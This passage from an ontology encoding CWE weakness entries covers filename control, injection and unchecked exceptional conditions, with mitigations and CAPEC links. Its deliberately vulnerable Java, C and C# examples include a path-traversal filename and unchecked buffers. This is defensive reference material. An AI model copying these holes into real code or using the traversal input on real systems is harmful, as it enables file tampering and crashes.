     Annotations: rdfs:comment "Using Escaped Slashes in Alternate Encoding"^^xsd:string
                 
                 related_attack_patterns  CAPEC-78,
     
     Annotations: rdfs:comment "Using Slashes in Alternate Encoding"^^xsd:string
                 
                 related_attack_patterns  CAPEC-79,
     
     Annotations: rdfs:comment "Using UTF-8 Encoding to Bypass Validation Logic"^^xsd:string
                 
                 related_attack_patterns  CAPEC-80,
     ID  "73"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "Run your code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory.
Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails."^^xsd:string, 
                 rdfs:comment "When the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to \"inbox.txt\" and ID 2 could map to \"profile.txt\". Features such as the ESAPI AccessReferenceMap provide this capability."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     availability  "DoS: Resource Consumption (Other)"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code."^^xsd:string
                 
                 availability  "Modify Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string, 
                 rdfs:comment "The application can operate on unexpected files. Availability can be violated if the attacker specifies an unexpected file that the application modifies. Availability can also be affected if the attacker specifies a filename for a large file, or points to a special device or a file that does not have the format that the application expects."^^xsd:string, 
                 rdfs:comment "The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker."^^xsd:string, 
                 rdfs:comment "The application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker."^^xsd:string, 
                 rdfs:comment "The application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code."^^xsd:string
                 
                 confidentiality  "Modify Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files (CWE-22).

(bad code)
Example Language: Java 
String rName = request.getParameter(\"reportName\");
File rFile = new File(\"/usr/local/apfr/reports/\" + rName);
...
rFile.delete();"^^xsd:string, 
                 rdfs:comment "Example 2
The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.

(bad code)
Example Language: Java 
fis = new FileInputStream(cfg.getProperty(\"sub\")+\".txt\");
amt = fis.read(arr);
out.println(arr);"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single \".\" character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as \"/\" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.
Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering \"/\" is insufficient protection if the filesystem also supports the use of \"\\\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if \"../\" sequences are removed from the \".../...//\" string in a sequential fashion, two instances of \"../\" would be removed from the original string, but the remaining characters would still form the \"../\" string."^^xsd:string, 
                 rdfs:comment "Use OS-level permissions and run as a low-privileged user to limit the scope of any successful attack."^^xsd:string, 
                 rdfs:comment "Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes \"..\" sequences and symbolic links (CWE-23, CWE-59)."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker."^^xsd:string, 
                 rdfs:comment "The application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code."^^xsd:string
                 
                 integrity  "Modify Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker."^^xsd:string
                 
                 integrity  "Read Files or Directories"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 operating_system  "Unix"^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 operating_system  "Windows"^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 operating_system  "macOS"^^xsd:string,
     
     Annotations: rdfs:comment "If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string, 
                 rdfs:comment "Run your code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory.
Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails."^^xsd:string, 
                 rdfs:comment "Use OS-level permissions and run as a low-privileged user to limit the scope of any successful attack."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis\"
The external control or influence of filenames can often be detected using automated static analysis that models data flow within the software.
Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes."^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."^^xsd:string, 
                 rdfs:comment "Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."^^xsd:string, 
                 rdfs:comment "Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 testing  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-74_Improper_Neutralization_of_Special_Elements_in_Output_Used_by_a_Downstream_Component

    Annotations: 
        rdfs:comment "Relationship:
In the development view (CWE-699), this is classified as an Input Validation problem (CWE-20) because many people do not distinguish between the consequence/attack (injection) and the protection mechanism that prevents the attack from succeeding. In the research view (CWE-1000), however, input validation is only one potential protection mechanism (output encoding is another), and there is a chaining relationship between improper input validation and the improper enforcement of the structure of messages to other components. Other issues not directly related to input validation, such as race conditions, could similarly impact message structure."^^xsd:string,
        rdfs:comment "Software has certain assumptions about what constitutes data and control respectively. It is the lack of verification of these assumptions for user-controlled input that leads to injection problems. Injection problems encompass a wide variety of issues -- all mitigated in very different ways and usually attempted in order to alter the control flow of the process. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities."^^xsd:string,
        rdfs:comment "The software constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Buffer Overflow via Environment Variables"^^xsd:string
                 
                 related_attack_patterns  CAPEC-10,
     
     Annotations: rdfs:comment "Server Side Include (SSI) Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-101,
     
     Annotations: rdfs:comment "Command Line Execution through SQL Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-108,
     
     Annotations: rdfs:comment "Double Encoding"^^xsd:string
                 
                 related_attack_patterns  CAPEC-120,
     
     Annotations: rdfs:comment "Subverting Environment Variable Values"^^xsd:string
                 
                 related_attack_patterns  CAPEC-13,
     related_attack_patterns  CAPEC-135,
     related_attack_patterns  CAPEC-14,
     related_attack_patterns  CAPEC-24,
     related_attack_patterns  CAPEC-242,
     related_attack_patterns  CAPEC-250,
     related_attack_patterns  CAPEC-267,
     related_attack_patterns  CAPEC-273,
     related_attack_patterns  CAPEC-28,
     related_attack_patterns  CAPEC-3,
     related_attack_patterns  CAPEC-34,
     related_attack_patterns  CAPEC-40,
     related_attack_patterns  CAPEC-42,
     related_attack_patterns  CAPEC-43,
     related_attack_patterns  CAPEC-45,
     related_attack_patterns  CAPEC-46,
     related_attack_patterns  CAPEC-47,
     related_attack_patterns  CAPEC-51,
     related_attack_patterns  CAPEC-52,
     related_attack_patterns  CAPEC-53,
     related_attack_patterns  CAPEC-64,
     related_attack_patterns  CAPEC-66,
     related_attack_patterns  CAPEC-67,
     related_attack_patterns  CAPEC-7,
     related_attack_patterns  CAPEC-71,
     related_attack_patterns  CAPEC-72,
     related_attack_patterns  CAPEC-76,
     related_attack_patterns  CAPEC-78,
     related_attack_patterns  CAPEC-79,
     related_attack_patterns  CAPEC-8,
     related_attack_patterns  CAPEC-80,
     related_attack_patterns  CAPEC-83,
     related_attack_patterns  CAPEC-84,
     related_attack_patterns  CAPEC-9,
     ID  "74"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "In some cases, injectable code controls authentication; this may lead to a remote vulnerability."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Many injection attacks involve the disclosure of important information -- in terms of both data sensitivity and usefulness in further exploitation."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Utilize an appropriate mix of whitelist and blacklist parsing to filter control-plane syntax from all input."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Data injection attacks lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing."^^xsd:string
                 
                 integrity  "Other"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often the actions performed by injected control code are unlogged."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "Injection attacks are characterized by the ability to significantly change the flow of a given process, and in some cases, to the execution of arbitrary code."^^xsd:string
                 
                 other  "Alter Execution Logic"^^xsd:string,
     
     Annotations: rdfs:comment "Data injection attacks lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing."^^xsd:string
                 
                 other  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Programming languages and supporting technologies might be chosen which are not subject to these issues."^^xsd:string
                 
                 requirements  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-754_Improper_Check_for_Unusual_or_Exceptional_Conditions

    Annotations: 
        rdfs:comment "Background Details:
Many functions will return some value about the success of their actions. This will alert the program whether or not to handle any errors caused by that function."^^xsd:string,
        rdfs:comment "Relationship:
Sometimes, when a return value can be used to indicate an error, an unchecked return value is a code-layer instance of a missing application-layer check for exceptional conditions. However, return values are not always needed to communicate exceptional conditions. For example, expiration of resources, values passed by reference, asynchronously modified data, sockets, etc. may indicate exceptional conditions without the use of a return value."^^xsd:string,
        rdfs:comment "The programmer may assume that certain events or conditions will never occur or do not need to be worried about, such as low memory conditions, lack of access to resources due to restrictive permissions, or misbehaving clients or components. However, attackers may intentionally trigger these unusual conditions, thus violating the programmer's assumptions, possibly introducing instability, incorrect behavior, or a vulnerability.

Note that this entry is not exclusively about the use of exceptions and exception handling, which are mechanisms for both checking and handling unusual or unexpected conditions."^^xsd:string,
        rdfs:comment "The software does not check or improperly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the software."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1012_Cross_Cutting,
     
     Annotations: rdfs:comment "Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail."^^xsd:string
                 
                 references  CVE-2006-2916,
     
     Annotations: rdfs:comment "Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail."^^xsd:string
                 
                 references  CVE-2006-4447,
     
     Annotations: rdfs:comment "Unchecked return value leads to resultant integer overflow and code execution."^^xsd:string
                 
                 references  CVE-2007-3798,
     ID  "754"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery."^^xsd:string, 
                 rdfs:comment "Use system limits, which should help to prevent resource exhaustion. However, the software should still handle low resource conditions since they may still occur."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The data which were produced as a result of a function call could be in a bad state upon return. If the return value is not checked, then this bad data may be used in operations, possibly leading to a crash or other unintended behaviors."^^xsd:string
                 
                 availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     
     Annotations: rdfs:comment "The data which were produced as a result of a function call could be in a bad state upon return. If the return value is not checked, then this bad data may be used in operations, possibly leading to a crash or other unintended behaviors."^^xsd:string
                 
                 availability  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
Consider the following code segment:

(bad code)
Example Language: C 
char buf[10], cp_buf[10];
fgets(buf, 10, stdin);
strcpy(cp_buf, buf);
The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy()."^^xsd:string, 
                 rdfs:comment "Example 2
The following code does not check to see if memory allocation succeeded before attempting to use the pointer returned by malloc().

(bad code)
Example Language: C 
buf = (char*) malloc(req_size);
strncpy(buf, xfer, req_size);

The traditional defense of this coding error is: \"If my program runs out of memory, it will fail. It doesn't matter whether I handle the error or simply allow the program to die with a segmentation fault when it tries to dereference the null pointer.\" This argument ignores three important considerations:
- Depending upon the type and size of the application, it may be possible to free memory that is being used elsewhere so that execution can continue.
- It is impossible for the program to perform a graceful exit if required. If the program is performing an atomic operation, it can leave the system in an inconsistent state.
- The programmer has lost the opportunity to record diagnostic information. Did the call to malloc() fail because req_size was too large or because there were too many requests being handled at the same time? Or was it caused by a memory leak that has built up over time? Without handling the error, there is no way to know."^^xsd:string, 
                 rdfs:comment "Example 3

The following examples read a file into a byte array.

(bad code)
Example Language: C# 
char[] byteArray = new char[1024];
for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) {
String userName = (String) i.Current();
String pFileName = PFILE_ROOT + \"/\" + userName;
StreamReader sr = new StreamReader(pFileName);
sr.Read(byteArray,0,1024);//the file is always 1k bytes
sr.Close();
processPFile(userName, byteArray);
}
(bad code)
Example Language: Java 
FileInputStream fis;
byte[] byteArray = new byte[1024];
for (Iterator i=users.iterator(); i.hasNext();) {
String userName = (String) i.next();
String pFileName = PFILE_ROOT + \"/\" + userName;
FileInputStream fis = new FileInputStream(pFileName);
fis.read(byteArray); // the file is always 1k bytes
fis.close();
processPFile(userName, byteArray);
The code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always 1 kilobyte in size and therefore ignores the return value from Read(). If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and treat it as though it belongs to the attacker."^^xsd:string, 
                 rdfs:comment "Example 4

The following code does not check to see if the string returned by getParameter() is null before calling the member function compareTo(), potentially causing a NULL dereference.

(bad code)
Example Language: Java 
String itemName = request.getParameter(ITEM_NAME);
if (itemName.compareTo(IMPORTANT_ITEM) == 0) {
...
}
...
The following code does not check to see if the string returned by the Item property is null before calling the member function Equals(), potentially causing a NULL dereference.

(bad code)
Example Language: Java 
String itemName = request.Item(ITEM_NAME);
if (itemName.Equals(IMPORTANT_ITEM)) {
...
}
...
The traditional defense of this coding error is: \"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value.\" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved."^^xsd:string, 
                 rdfs:comment "Example 5
The following code shows a system property that is set to null and later dereferenced by a programmer who mistakenly assumes it will always be defined.

(bad code)
Example Language: Java 
System.clearProperty(\"os.name\");
...
String os = System.getProperty(\"os.name\");
if (os.equalsIgnoreCase(\"Windows 95\")) System.out.println(\"Not supported\");
The traditional defense of this coding error is: \"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value.\" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved."^^xsd:string, 
                 rdfs:comment "Example 6
The following VB.NET code does not check to make sure that it has read 50 bytes from myfile.txt. This can cause DoDangerousOperation() to operate on an unexpected value.

(bad code)
Example Language: C# 
Dim MyFile As New FileStream(\"myfile.txt\", FileMode.Open, FileAccess.Read, FileShare.Read)
Dim MyArray(50) As Byte
MyFile.Read(MyArray, 0, 50)
DoDangerousOperation(MyArray(20))
In .NET, it is not uncommon for programmers to misunderstand Read() and related methods that are part of many System.IO classes. The stream and reader classes do not consider it to be unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested."^^xsd:string, 
                 rdfs:comment "Example 7
This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.

(bad code)
Example Language: C 
void host_lookup(char *user_supplied_addr){
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

/*routine that ensures user_supplied_addr is in the right format for conversion */ 

validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);
}
If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. When this occurs, a NULL pointer dereference (CWE-476) will occur in the call to strcpy().

Note that this example is also vulnerable to a buffer overflow (see CWE-119)."^^xsd:string, 
                 rdfs:comment "Example 8

In the following C/C++ example the method outputStringToFile opens a file in the local filesystem and outputs a string to the file. The input parameters output and filename contain the string to output to the file and the name of the file respectively.

(bad code)
Example Language: C++ 
int outputStringToFile(char *output, char *filename) {

openFileToWrite(filename);
writeToFile(output);
closeFile(filename);
}
However, this code does not check the return values of the methods openFileToWrite, writeToFile, closeFile to verify that the file was properly opened and closed and that the string was successfully written to the file. The return values for these methods should be checked to determine if the method was successful and allow for detection of errors or unexpected conditions as in the following example.

(good code)
Example Language: C++ 
int outputStringToFile(char *output, char *filename) {
int isOutput = SUCCESS;

int isOpen = openFileToWrite(filename);
if (isOpen == FAIL) {
printf(\"Unable to open file %s\", filename);
isOutput = FAIL;
}
else {
int isWrite = writeToFile(output);
if (isWrite == FAIL) {
printf(\"Unable to write to file %s\", filename);
isOutput = FAIL;
}

int isClose = closeFile(filename);
if (isClose == FAIL)
isOutput = FAIL;
}
return isOutput;
}"^^xsd:string, 
                 rdfs:comment "Example 9

In the following Java example the method readFromFile uses a FileReader object to read the contents of a file. The FileReader object is created using the File object readFile, the readFile object is initialized using the setInputFile method. The setInputFile method should be called before calling the readFromFile method.

(bad code)
Example Language: Java 
private File readFile = null;

public void setInputFile(String inputFile) {

// create readFile File object from string containing name of file 
}

public void readFromFile() {
try {
reader = new FileReader(readFile);

// read input file 
} catch (FileNotFoundException ex) {...}
}
However, the readFromFile method does not check to see if the readFile object is null, i.e. has not been initialized, before creating the FileReader object and reading from the input file. The readFromFile method should verify whether the readFile object is null and output an error message and raise an exception if the readFile object is null, as in the following code.

(good code)
Example Language: Java 
private File readFile = null;

public void setInputFile(String inputFile) {

// create readFile File object from string containing name of file 
}

public void readFromFile() {
try {
if (readFile == null) {
System.err.println(\"Input file has not been set, call setInputFile method before calling openInputFile\");
throw NullPointerException;
}

reader = new FileReader(readFile);

// read input file 
} catch (FileNotFoundException ex) {...}
catch (NullPointerException ex) {...}
}"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Manual Dynamic Analysis
Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself."^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Check the results of all functions that return a value and verify that the value is expected.
Effectiveness: High
Note: Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment."^^xsd:string, 
                 rdfs:comment "Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.
If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.
Exposing additional information to a potential attacker in the context of an exceptional condition can help the attacker determine what attack vectors are most likely to succeed beyond DoS."^^xsd:string, 
                 rdfs:comment "If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery."^^xsd:string, 
                 rdfs:comment "If using exception handling, catch and throw specific exceptions instead of overly-general exceptions (CWE-396, CWE-397). Catch and handle exceptions as locally as possible so that exceptions do not propagate too far up the call stack (CWE-705). Avoid unchecked or uncaught exceptions where feasible (CWE-248).
Effectiveness: High

Note: Using specific exceptions, and ensuring that exceptions are checked, helps programmers to anticipate and appropriately handle many unusual events that could occur."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
Note: Performing extensive input validation does not help with handling unusual conditions, but it will minimize their occurrences and will make it more difficult for attackers to trigger them."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The data which were produced as a result of a function call could be in a bad state upon return. If the return value is not checked, then this bad data may be used in operations, possibly leading to a crash or other unintended behaviors."^^xsd:string
                 
                 integrity  "DoS: Crash, Exit, or Restart"^^xsd:string,
     
     Annotations: rdfs:comment "The data which were produced as a result of a function call could be in a bad state upon return. If the return value is not checked, then this bad data may be used in operations, possibly leading to a crash or other unintended behaviors."^^xsd:string
                 
                 integrity  "Unexpected State"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Language Selection
Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Choose languages with features such as exception handling that force the programmer to anticipate unusual conditions that may generate exceptions. Custom exceptions may need to be developed to handle unusual business-logic conditions. Be careful not to pass sensitive exceptions back to the user (CWE-209, CWE-248)."^^xsd:string
                 
                 requirements  ""^^xsd:string,
     
     Annotations: rdfs:comment "Automated static analysis may be useful for detecting unusual conditions involving system resources or common programming idioms, but not for violations of business rules.
Effectiveness: Moderate"^^xsd:string
                 
                 static  "automated"^^xsd:string
    
    
Individual: CWE-755_Improper_Handling_of_Exceptional_Conditions

    Annotations: 
        rdfs:comment "The software does not handle or incorrectly handles an exceptional condition."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     
